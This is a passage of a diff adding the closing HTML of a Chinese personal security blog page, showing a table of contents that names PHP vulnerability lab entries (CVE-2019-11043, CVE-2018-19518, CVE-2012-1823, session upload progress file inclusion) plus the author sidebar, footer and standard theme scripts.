+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#311-CVE-2019-11043"><span class="nav-number">1.</span> <span class="nav-text">311 (CVE-2019-11043)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#312-CVE-2018-19518-PHP-IMAP"><span class="nav-number">2.</span> <span class="nav-text">312(CVE-2018-19518)-PHP-IMAP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#313-CVE-2012-1823-PHP-CGI"><span class="nav-number">3.</span> <span class="nav-text">313(CVE-2012-1823)-PHP-CGI</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#314-PHP-SESSION-UPLOAD-PROGRESS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">4.</span> <span class="nav-text">314(PHP_SESSION_UPLOAD_PROGRESS文件包含)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#315"><span class="nav-number">5.</span> <span class="nav-text">315</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="程勇胜"
+      src="/images/cys.jpg">
+  <p class="site-author-name" itemprop="name">程勇胜</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1216043519@qq.com" title="E-Mail → mailto:1216043519@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">程勇胜</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
